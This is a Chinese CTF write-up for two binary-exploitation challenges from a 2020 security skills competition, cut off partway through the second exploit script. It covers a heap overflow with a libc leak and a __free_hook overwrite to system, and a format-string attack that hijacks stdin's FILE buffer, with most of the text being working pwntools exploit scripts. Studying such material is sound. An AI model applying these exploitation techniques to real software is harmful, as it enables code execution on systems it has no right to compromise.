<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP</title>
      <link href="1970/01/01/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/"/>
      <url>1970/01/01/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>自己只做了pwn2，就从pwn2开始</p><p>c++用于输入输出,主要逻辑是用c实现的。因为会调用c++的库，这里涉及到一些库的库的加载。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836235597.png" alt="add"></p><p>当进行add的时候如果size为0将会成功申请空间</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836644128.png" alt="edit"></p><p>在edit的时候如果size为0可以无限制的获取输入，造成了堆溢出。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>1.libc2.27需要填满tcach然后泄露libc地址。但是这里泄露出来的libc如下图，泄露出来的是第二条线的地址，实际上需要的是第一条线的地址，实际上这几部分是同一个库，相对的偏移都是固定的。</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836598126.png" alt="加载"></p><ul><li>2.用fastbin attack劫持__malloc_hook，2.27使得可以申请到任何一段空间不需要size的限制。实际上__malloc_hook劫持成one_gatget这里不行。实际用system函数劫持__free_hook</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836619586.png" alt="free_hook"></p><p>这里有一个问题：__free_hook看到的地址是在data区域,但是pwntools的symbols还是获取到了正确的偏移。</p><ul><li>3.保存点小技巧：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span></span><br><span class="line">  debug_str = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> PIE:</span><br><span class="line">    text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">      debug_str+=<span class="string">&#x27;x /10xg &#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+i))</span><br><span class="line">    gdb.attach(p,debug_str)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">      debug_str+=<span class="string">&#x27;b *&#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+i))</span><br><span class="line">    gdb.attach(p,debug_str)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以很方便调试开启了PIE的程序，把命令改掉可以换成下断点</p><p> Ubuntu18使用fastbin attack是直接把fd指针指向要修改的地址就好</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">prog = <span class="string">&#x27;./noteplus&#x27;</span></span><br><span class="line"><span class="comment"># #elf = ELF(prog)</span></span><br><span class="line"><span class="comment"># # p = process(prog)#,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment"># p = remote(&quot;121.36.245.213&quot;, 23333)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="keyword">from</span> one_gadget <span class="keyword">import</span> generate_one_gadget</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    path_to_libc = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    one=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">    p = process(prog)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one = [<span class="number">0x10a45c</span>, <span class="number">0x4f3c2</span>, <span class="number">0x4f365</span>]</span><br><span class="line">    p=remote(<span class="string">&quot;121.36.245.213&quot;</span>, <span class="number">23333</span>)</span><br><span class="line">    path_to_libc=<span class="string">&quot;/media/tower/data/work/ctf/dianxin/pwn2/460f7fe9177846df879863c485e2940b/libc-2.27.so&quot;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(path_to_libc)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget_list</span>():</span></span><br><span class="line">    one=[]</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> generate_one_gadget(path_to_libc):</span><br><span class="line">        print(<span class="built_in">hex</span>(offset))</span><br><span class="line">        one.append(offset)</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># one=one_gadget_list()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;/glibc/2.27/64/lib/ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;: &quot;/glibc/2.27/64/lib/libc.so.6&quot;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./libc-2.27.so&quot;, &quot;./noteplus&quot;], env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span></span><br><span class="line">  debug_str = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> PIE:</span><br><span class="line">    text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">      debug_str+=<span class="string">&#x27;x /10xg &#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+i))</span><br><span class="line">    gdb.attach(p,debug_str)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">      debug_str+=<span class="string">&#x27;b *&#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+i))</span><br><span class="line">    gdb.attach(p,debug_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;our choice: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;ize: &quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;our choice: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;our choice: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,index)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">View</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;our choice: &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,index)</span><br><span class="line"></span><br><span class="line">index=<span class="number">0x8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index):</span><br><span class="line">    New(<span class="built_in">str</span>(i), <span class="built_in">str</span>(<span class="number">0x98</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">9</span>), <span class="built_in">str</span>(<span class="number">0x98</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">0xa</span>), <span class="built_in">str</span>(<span class="number">0x98</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">0xb</span>), <span class="built_in">str</span>(<span class="number">0x98</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index<span class="number">-1</span>):</span><br><span class="line">    Delete(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">Delete(<span class="built_in">str</span>(<span class="number">9</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">0xc</span>), <span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">View(<span class="built_in">str</span>(<span class="number">0xc</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_content=p.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">libc.address=u64(libc_content)<span class="number">-0xb78</span><span class="number">-0x1b8</span><span class="number">-0x3eb000</span></span><br><span class="line">print(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">0</span>),<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">Delete(<span class="built_in">str</span>(<span class="number">0xa</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">0x1</span>),<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">0x2</span>),<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">0x3</span>),<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">0x4</span>),<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">Delete(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">Delete(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">Delete(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">Delete(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="comment"># New(str(5),str(0x68))</span></span><br><span class="line"><span class="comment"># New(str(6),str(0x68))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Delete(str(5))</span></span><br><span class="line"><span class="comment"># print(hex(libc.symbols[&quot;__malloc_hook&quot;]))</span></span><br><span class="line"><span class="comment">#0x354b78</span></span><br><span class="line">Edit(<span class="built_in">str</span>(<span class="number">0</span>),p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x71</span>)+p64(libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]<span class="number">-8</span>)*<span class="number">2</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"><span class="comment"># debug([0x203320])</span></span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">1</span>),<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line"></span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">2</span>),<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">3</span>),<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">4</span>),<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">New(<span class="built_in">str</span>(<span class="number">5</span>),<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line"><span class="comment"># print(hex(libc.sym[&quot;realloc&quot;]))</span></span><br><span class="line">Edit(<span class="built_in">str</span>(<span class="number">5</span>),p64(libc.symbols[<span class="string">&quot;system&quot;</span>])+<span class="string">&quot;\n&quot;</span>)<span class="comment">#p64(libc.symbols[&quot;__malloc_hook&quot;]-0x3eb000-8+13)+&quot;\n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># New(str(6),str(0x68))</span></span><br><span class="line"></span><br><span class="line">Edit(<span class="built_in">str</span>(<span class="number">0</span>),<span class="string">&quot;a&quot;</span>*<span class="number">32</span>+p64(<span class="number">0x71</span>)+<span class="string">&quot;/bin/sh\x00\n&quot;</span>)</span><br><span class="line">debug([<span class="number">0x203320</span>])</span><br><span class="line">Delete(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>__isoc99_scanf   调用_IO_vfscanf_internal 调用__GI__IO_default_uflow 调用_IO_new_file_underflow</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> count;</span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)   <span class="comment">//检查:_IO_read_ptr要比_IO_read_end大</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)<span class="comment">//缓冲区为空分配空间</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">          fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">        &#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">         required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">         traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">         not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">         explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">          == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">        _IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">                       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="comment">//向_IO_buf_base处写入数据,读取的实际长度是_IO_buf_end -_IO_buf_base</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;<span class="comment">//读取结束后_IO_read_end加上读取的长度</span></span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">         handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">         unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里是把数据读到缓冲区,read_ptr指针是把数据从缓冲区读到用户空间,所以这里read_ptr指针要比较大</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604907487628.png" alt="指针情况"></p><p>实际IO_file结构在内存中的情况是</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604909452890.png" alt="IO_file结构"></p><h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><p>泄露libc加载地址。是原始偏移加上栈上的偏移，一般情况下64位程序的原始偏移是6，如题的0xf+6=21，wp里面用%21$p进行泄露.</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604902851396.png" alt="偏移"></p><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><ul><li>用格式化字符串漏洞修改栈里面的_IO_file结构</li><li>用scanf函数向修改后的_IO_buf_base结构写入数据修改_IO_buf_base和_IO_buf_end 指针修改为main函数的返回地址(一个栈地址)</li><li>持续的getchar让_IO_read_ptr追上_IO_read_end指针,这样才能再次读入数据</li><li>修改返回地址</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x83</span> + _IO_2_1_stdin_addr)*<span class="number">3</span> + p64(main_ret) + p64(main_ret + <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">echo2(payload)</span><br><span class="line">debug([<span class="number">0x000000000000106D</span>,<span class="number">0x000000000000FFE</span>])</span><br></pre></td></tr></table></figure><p>完成上面第二步,在标记的地方就是写入数据开始的地方(原来IO_read_base指向的地方)</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604910603484.png" alt="修改后的IO_file"></p><p>但是这时read_ptr指针是小于read_end指针的所以需要调用多次getchar()实际上应该是调用lenpayload次(在发送上面payload的时候已经调用了一次,后面还需要lenpayload-1次)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./Echo&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./Echo&quot;</span>).libc</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;121.36.216.253&#x27;,10001)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span> </span><br><span class="line">    debug_str = <span 